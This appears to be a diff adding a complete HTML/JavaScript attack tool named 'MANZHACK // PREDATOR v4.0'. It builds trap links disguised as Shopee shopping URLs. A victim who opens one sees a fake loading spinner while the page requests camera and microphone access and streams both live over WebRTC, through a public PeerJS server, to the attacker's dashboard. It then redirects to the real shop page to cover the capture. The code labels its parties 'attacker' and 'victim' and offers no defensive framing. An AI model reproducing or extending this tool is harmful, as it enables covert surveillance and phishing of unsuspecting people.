@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MANZHACK // PREDATOR v4.0 (Manual Control)</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peer.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-deep: #0a0a0a; --bg-card: #141414; --primary-accent: #00ffc3; --status-online: #00ffc3;
+            --text-light: #e0e0e0; --text-dark: #a0a0e0; --border-color: #2a2a2a;
+            --status-offline: #ff003b; --status-connecting: #ffcc00;
+        }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; font-family: 'Roboto Mono', monospace; background-color: var(--bg-deep); color: var(--text-light); }
+        .container { padding: 2rem; max-width: 1000px; margin: auto; }
+        .dashboard-section {
+            border: 1px solid var(--border-color); padding: 2rem; border-radius: 8px;
+            background-color: var(--bg-card); box-shadow: 0 0 25px rgba(0, 255, 195, 0.1); margin-bottom: 2rem;
+        }
+        h1, h2 { color: var(--primary-accent); text-align: center; text-shadow: 0 0 8px var(--primary-accent); }
+        button {
+            width: 100%; padding: 1rem; color: #000; border: none; cursor: pointer;
+            font-size: 1rem; border-radius: 4px; font-weight: bold; transition: all 0.3s;
+        }
+        button.primary { background: var(--primary-accent); }
+        button.primary:hover { background: #fff; color: #000; box-shadow: 0 0 15px var(--primary-accent); }
+        button:disabled { background: #333; color: #777; cursor: not-allowed; }
+        #link-generator { opacity: 0.3; pointer-events: none; }
+        #link-generator.enabled { opacity: 1; pointer-events: auto; }
+        #status-box { padding: 1rem; border-radius: 4px; text-align: center; margin-bottom: 1rem; }
+        #status-box.offline { background: var(--status-offline); color: #fff; }
+        #status-box.connecting { background: var(--status-connecting); color: #000; }
+        #status-box.online { background: var(--status-online); color: #000; }
+        #live-stream { width: 100%; background: #000; border-radius: 4px; border: 1px solid var(--border-color); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="connection-control" class="dashboard-section">
+            <h2>:: OPERATOR CONTROL ::</h2>
+            <div id="status-box" class="offline">STATUS: OFFLINE</div>
+            <button id="connect-btn" class="primary" onclick="initializeOperatorPeer()">GO ONLINE</button>
+        </div>
+
+        <div id="link-generator" class="dashboard-section">
+            <h2>:: LINK GENERATOR ::</h2>
+            <input type="url" id="shopee-url" placeholder="Paste Shopee URL here...">
+            <button id="generate-btn" class="primary" onclick="generateLink()">INITIALIZE LIVE FEED</button>
+            <div id="generated-link" style="margin-top: 1rem;"></div>
+        </div>
+
+        <div id="live-feed-container" class="dashboard-section">
+            <h2>:: LIVE TARGET FEED ::</h2>
+            <video id="live-stream" autoplay playsinline></video>
+            <p id="feed-status" style="text-align:center; color: var(--text-dark); margin-top:1rem;">Feed is currently offline.</p>
+        </div>
+    </div>
+
+    <script>
+        let peer = null;
+
+        const connectBtn = document.getElementById('connect-btn');
+        const statusBox = document.getElementById('status-box');
+        const linkGenerator = document.getElementById('link-generator');
+        const feedStatus = document.getElementById('feed-status');
+
+        function setStatus(status, message) {
+            statusBox.className = 'status-box';
+            statusBox.classList.add(status);
+            statusBox.textContent = `STATUS: ${message}`;
+        }
+
+        function initializeOperatorPeer() {
+            if (peer && !peer.destroyed) { peer.destroy(); }
+
+            setStatus('connecting', 'Connecting to signaling server...');
+            connectBtn.disabled = true;
+            connectBtn.textContent = 'CONNECTING...';
+
+            const myId = 'attacker-' + Math.random().toString(36).substr(2, 9);
+            peer = new Peer(myId, { host: 'peerjs.peerjs.com', path: '/' });
+
+            peer.on('open', id => {
+                setStatus('online', `ONLINE - Operator ID Ready`);
+                window.OPERATOR_ID = id;
+                connectBtn.textContent = 'RE-CONNECT';
+                connectBtn.disabled = false;
+                linkGenerator.classList.add('enabled');
+            });
+
+            peer.on('call', call => {
+                feedStatus.textContent = `Target connected! Establishing live stream...`;
+                call.answer();
+                const video = document.getElementById('live-stream');
+                call.on('stream', remoteStream => {
+                    feedStatus.textContent = `LIVE FEED ACTIVE.`;
+                    video.srcObject = remoteStream;
+                    video.play();
+                });
+            });
+
+            peer.on('error', err => {
+                setStatus('offline', `ERROR - ${err.type}. Check Console (Ctrl+Shift+I).`);
+                connectBtn.textContent = 'GO ONLINE';
+                connectBtn.disabled = false;
+                linkGenerator.classList.remove('enabled');
+                console.error("PeerJS Error:", err);
+            });
+        }
+
+        function generateLink() {
+            const attackerId = window.OPERATOR_ID;
+            const shopeeUrl = document.getElementById('shopee-url').value;
+            if (!shopeeUrl.startsWith('http')) { alert("Invalid URL format."); return; }
+            
+            const victimId = 'victim-' + Date.now();
+            const encodedUrl = btoa(shopeeUrl);
+            const trapLink = `${window.location.origin}${window.location.pathname}?vid=${victimId}&aid=${attackerId}&target=${encodedUrl}`;
+            
+            document.getElementById('generated-link').innerHTML = `<input type="text" value="${trapLink}" readonly onclick="this.select(); document.execCommand('copy');">`;
+        }
+
+        // --- VICTIM'S SIDE ---
+        const params = new URLSearchParams(window.location.search);
+        const victimId = params.get('vid');
+        if (victimId) {
+            document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#fff;"><div style="border:5px solid #f3f3f3;border-top:5px solid #ff6600;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;"></div></div><style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>`;
+            
+            const attackerId = params.get('aid');
+            const targetUrlBase64 = params.get('target');
+            const redirectUrl = atob(targetUrlBase64);
+
+            peer = new Peer(victimId);
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                peer.call(attackerId, stream);
+                setTimeout(() => { window.location.href = redirectUrl; }, 1500);
+            }).catch(err => {
+                window.location.href = redirectUrl;
+            });
+        }
+    </script>
+</body>
+</html>
